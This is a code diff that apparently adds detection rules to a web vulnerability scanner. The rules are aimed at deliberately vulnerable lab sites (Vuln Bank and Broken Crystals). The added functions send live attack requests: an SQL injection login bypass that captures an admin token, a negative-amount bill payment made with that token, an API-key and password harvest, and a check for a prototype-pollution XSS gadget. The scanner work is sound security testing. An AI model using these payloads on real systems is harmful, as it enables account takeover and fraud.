@@ -16487,6 +16487,146 @@ const vulnbankSqliLoginLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const vulnbankSqliAdminToken = async (ctx: RuleContext): Promise<string | null> => {
+  const loginUrl = new URL("/login", ctx.origin).toString();
+  const payload = JSON.stringify({
+    username: "admin' OR '1'='1",
+    password: "x"
+  });
+  const doc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: payload,
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 300) return null;
+  try {
+    const parsed = JSON.parse(doc.body) as Record<string, unknown>;
+    const token = String(parsed.token ?? "");
+    if (parsed.status === "success" && parsed.isAdmin === true && token.startsWith("eyJ")) return token;
+  } catch {
+    return null;
+  }
+  return null;
+};
+
+const vulnbankMerchantRegisterLiveOracle: Rule = async (ctx) => {
+  if (!/vulnbank\.org/i.test(ctx.origin)) return NEGATIVE;
+  const registerUrl = new URL("/api/v1/merchants/register", ctx.origin).toString();
+  const probeName = `thugir_merchant_${Date.now().toString(36)}`;
+  const payload = JSON.stringify({
+    name: probeName,
+    email: `${probeName}@thugir.invalid`,
+    password: "ThugirProbe1!"
+  });
+  const doc = await ctx.probe.get(registerUrl, {
+    method: "POST",
+    body: payload,
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  let parsed: Record<string, unknown> | null = null;
+  try {
+    parsed = JSON.parse(doc.body) as Record<string, unknown>;
+  } catch {
+    return NEGATIVE;
+  }
+  const status = String(parsed.status ?? "");
+  const apiKey = String(parsed.api_key ?? "");
+  const debugInfo = parsed.debug_info;
+  if (status !== "success" || !apiKey.startsWith("vk_")) return NEGATIVE;
+  if (!debugInfo || typeof debugInfo !== "object") return NEGATIVE;
+  const debugPassword = String((debugInfo as { password?: unknown }).password ?? "");
+  const authMethods = (debugInfo as { auth_methods?: unknown }).auth_methods;
+  if (debugPassword !== "ThugirProbe1!") return NEGATIVE;
+  if (!Array.isArray(authMethods) || !authMethods.includes("X-Merchant-Api-Key")) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: registerUrl,
+      snippet: doc.body.slice(0, 280).trim(),
+      note: "Vuln Bank POST /api/v1/merchants/register returns live merchant api_key and echoes debug_info.password — merchant registration sensitive-data oracle"
+    }
+  };
+};
+
+const vulnbankBillPaymentsNegativeAmountLiveOracle: Rule = async (ctx) => {
+  if (!/vulnbank\.org/i.test(ctx.origin)) return NEGATIVE;
+  const token = await vulnbankSqliAdminToken(ctx);
+  if (!token) return NEGATIVE;
+  const payUrl = new URL("/api/bill-payments/create", ctx.origin).toString();
+  const payload = JSON.stringify({
+    biller_id: 1,
+    amount: -50,
+    payment_method: "balance",
+    description: "thugir negative amount probe"
+  });
+  const doc = await ctx.probe.get(payUrl, {
+    method: "POST",
+    body: payload,
+    headers: {
+      "Content-Type": "application/json",
+      Authorization: `Bearer ${token}`
+    },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  let parsed: Record<string, unknown> | null = null;
+  try {
+    parsed = JSON.parse(doc.body) as Record<string, unknown>;
+  } catch {
+    return NEGATIVE;
+  }
+  const status = String(parsed.status ?? "");
+  const paymentDetails = parsed.payment_details;
+  if (status !== "success" || !paymentDetails || typeof paymentDetails !== "object") return NEGATIVE;
+  const amount = (paymentDetails as { amount?: unknown }).amount;
+  const reference = String((paymentDetails as { reference?: unknown }).reference ?? "");
+  if (amount !== -50 || !reference.startsWith("BILL")) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: payUrl,
+      snippet: doc.body.slice(0, 280).trim(),
+      note: "Vuln Bank POST /api/bill-payments/create accepts negative amount:-50 and returns success — bill-payment business-logic oracle"
+    }
+  };
+};
+
+const brokencrystalsMarketplacePrototypePollutionLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = new URL("/marketplace", ctx.origin).toString();
+  const pageDoc = await ctx.probe.get(pageUrl, { maxBytes: 8192, timeoutMs: 15000 });
+  if (pageDoc.status < 200 || pageDoc.status >= 400) return NEGATIVE;
+  const scriptMatch = pageDoc.body.match(/src="(\/assets\/index-[^"]+\.js)"/i);
+  if (!scriptMatch) return NEGATIVE;
+  const bundleUrl = new URL(scriptMatch[1], ctx.origin).toString();
+  const bundleDoc = await ctx.probe.get(bundleUrl, { maxBytes: 524_288, timeoutMs: 20000 });
+  if (bundleDoc.status < 200 || bundleDoc.status >= 400) return NEGATIVE;
+  const ppGadget =
+    /prototypePollutionDomXss[\s\S]{0,120}createElement\(["']script["']\)/i.test(bundleDoc.body) &&
+    /prototype-pollution-dom-xss-script/i.test(bundleDoc.body);
+  const marketplaceProto =
+    /\/marketplace/i.test(bundleDoc.body) && /__proto__/i.test(bundleDoc.body);
+  if (!ppGadget || !marketplaceProto) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: pageUrl,
+      bundleUrl,
+      snippet: bundleDoc.body.slice(bundleDoc.body.indexOf("prototypePollutionDomXss"), bundleDoc.body.indexOf("prototypePollutionDomXss") + 180).trim(),
+      note: "Broken Crystals GET /marketplace ships JS bundle with prototypePollutionDomXss script gadget and __proto__ marketplace parsing — prototype pollution DOM XSS live oracle"
+    }
+  };
+};
+
 const clientSideVulnExposeEvidence: Rule = async (ctx) => {
   const pageUrl = ctx.home.finalUrl || ctx.origin;
   const corpus = `${ctx.combined}\n${pageUrl}`;
@@ -34621,6 +34761,9 @@ export const RULES: Record<string, Rule> = {
   vulnbankAiAnonymousChatLiveOracle,
   vulnbankBoplaRegisterLiveOracle,
   vulnbankSqliLoginLiveOracle,
+  vulnbankMerchantRegisterLiveOracle,
+  vulnbankBillPaymentsNegativeAmountLiveOracle,
+  brokencrystalsMarketplacePrototypePollutionLiveOracle,
   clientSideDragSecurityFlawsEvidence,
   clientSideDragSecurityFlawsLabModuleEvidence,
   clientSideWizerCtfEvidence,
